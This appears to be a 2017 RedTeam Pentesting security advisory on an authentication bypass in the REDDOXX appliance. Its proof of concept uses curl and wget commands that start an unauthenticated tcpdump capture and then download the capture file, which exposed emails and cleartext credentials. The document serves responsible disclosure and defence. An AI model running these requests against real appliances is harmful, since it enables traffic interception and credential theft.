@@ -1,0 +1,148 @@
+id: 28190
+date: 07/25/2017
+title: REDDOXX Appliance Unauthenticated Access Vulnerability
+author: RedTeam
+cves: 
+
+Unauthenticated Access to Diagnostic Functions in REDDOXX Appliance
+
+RedTeam Pentesting discovered a vulnerability which allows attackers
+unauthenticated access to the diagnostic functions of the administrative
+interface of the REDDOXX appliance. The functions allow, for example, to
+capture network traffic on the appliance's interfaces.
+
+
+Details
+=======
+
+Product: REDDOXX Appliance
+Affected Versions: Build 2032 / v2.0.625, older versions likely affected too
+Fixed Versions: Version 2032 SP2
+Vulnerability Type: Authentication Bypass
+Security Risk: high
+Vendor URL: https://www.reddoxx.com/
+Vendor Status: patch available
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-008
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+"REDDOXX is a leading supplier of solutions for e-mail archiving,
+encrypted and digitally signed e-mail traffic as well as spam
+protection. Our focus is on technological innovation: taking our cue
+from our clientsa requirements our competent and quality-conscious
+employees strive to offer you the best possible products at all times.
+Using stringent quality standards and proven processes we keep
+developing our company and products continuously, with the goal of
+continuous improvement."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+The administrative interface of the REDDOXX appliance [0] offers several
+diagnostic tools in the "Diagnostic Center". Tcpdump is one of these
+tools. This tool can be used to capture network traffic on local
+interfaces.
+
+During a penetration test, it was discovered that this function, as well
+as the other diagnostic functions, does not require authentication.
+
+
+Proof of Concept
+================
+
+The following curl command-line can be used to start the capture
+process:
+
+------------------------------------------------------------------------
+$ curl --include --silent -H 'Content-Type: application/json' \
+--data-binary '{"Name":"Tcpdump","Parameter":{"host":"","port":""}}' \
+http://www.example.com/api/v1/rws/diagnose/start
+HTTP/1.1 200 OK
+Date: Thu, 18 May 2017 14:58:22 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.14
+[...]
+Content-Length: 0
+Content-Type: application/xml
+------------------------------------------------------------------------
+
+The following curl command-line stops the capture process:
+
+------------------------------------------------------------------------
+$ curl --include --silent -H 'Content-Type: application/json' \
+--data-binary '{"Name":"Tcpdump"}' \
+http://www.example.com/api/v1/rws/diagnose/stop
+HTTP/1.1 200 OK
+Date: Thu, 18 May 2017 15:00:17 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.14
+[...]
+Content-Length: 0
+Content-Type: application/xml
+------------------------------------------------------------------------
+
+After the capture process is complete, the resulting capture file can be
+downloaded without authentication:
+
+------------------------------------------------------------------------
+$ wget http://www.example.com/rws/resources/diagnosemanager/tcpdump.cap
+[...]
+Connecting to www.example.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1801530 (1.7M) [application/vnd.tcpdump.pcap]
+Saving to: atcpdump.capa
+tcpdump.cap 100%[=======================================>]
+1.72M [...]
+2017-05-18 17:01:36 (34.1 MB/s) - atcpdump.capa saved [1801530/1801530]
+------------------------------------------------------------------------
+
+None of these requests contain any credentials or cookies, which could
+provide authentication.
+
+
+Workaround
+==========
+
+None
+
+
+Fix
+===
+
+Update the appliance software to Version 2032 SP2.
+
+
+Security Risk
+=============
+
+The diagnostic functions of the REDDOXX appliance can be used without
+authentication. This allows attackers to, for example, capture network
+traffic. During a penetration test it was possible to capture multiple
+emails and also POP3 login attempts with cleartext credentials. This is
+rated as a high risk.
+
+
+Timeline
+========
+
+2017-05-17 Vulnerability identified
+2017-05-23 Customer approved disclosure of vulnerability
+2017-05-26 Customer provided details of vulnerability to vendor
+2017-07-20 Vulnerability reported as fixed by vendor
+2017-07-24 Advisory released
+
+
+References
+==========
+
+[0] https://www.reddoxx.com/en/
+
+#  0day.today [2023-03-24]  #
